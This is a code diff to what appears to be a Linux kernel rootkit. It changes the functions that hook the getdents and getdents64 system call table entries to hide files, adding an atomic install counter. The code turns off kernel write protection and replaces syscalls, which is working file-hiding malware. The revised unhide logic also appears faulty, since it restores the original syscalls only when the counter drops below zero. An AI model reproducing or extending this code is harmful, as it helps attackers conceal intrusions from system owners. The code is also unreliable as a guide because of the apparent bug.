@@ -14,27 +14,33 @@
 void
 hide_files(void)
 {
-    disable_protection();
-    sys_calls[__NR_getdents] = (void *)g7_getdents;
-    sys_calls[__NR_getdents64] = (void *)g7_getdents64;
-    enable_protection();
+    if (atomic_inc_return(&getdents_install_count) == 1) {
+        disable_protection();
+        sys_calls[__NR_getdents] = (void *)g7_getdents;
+        sys_calls[__NR_getdents64] = (void *)g7_getdents64;
+        enable_protection();
+    }
 }
 
 void
 unhide_files(void)
 {
-    if (sys_getdents) {
-        disable_protection();
-        sys_calls[__NR_getdents] = (void *)sys_getdents;
-        enable_protection();
-        while (atomic_read(&getdents_count) > 0);
-    }
+    if (atomic_dec_return(&getdents_install_count) < 0) {
+        atomic_set(&getdents_install_count, 0);
 
-    if (sys_getdents64) {
-        disable_protection();
-        sys_calls[__NR_getdents64] = (void *)sys_getdents64;
-        enable_protection();
-        while (atomic_read(&getdents64_count) > 0);
+        if (sys_getdents) {
+            disable_protection();
+            sys_calls[__NR_getdents] = (void *)sys_getdents;
+            enable_protection();
+            while (atomic_read(&getdents_count) > 0);
+        }
+
+        if (sys_getdents64) {
+            disable_protection();
+            sys_calls[__NR_getdents64] = (void *)sys_getdents64;
+            enable_protection();
+            while (atomic_read(&getdents64_count) > 0);
+        }
     }
 }
 
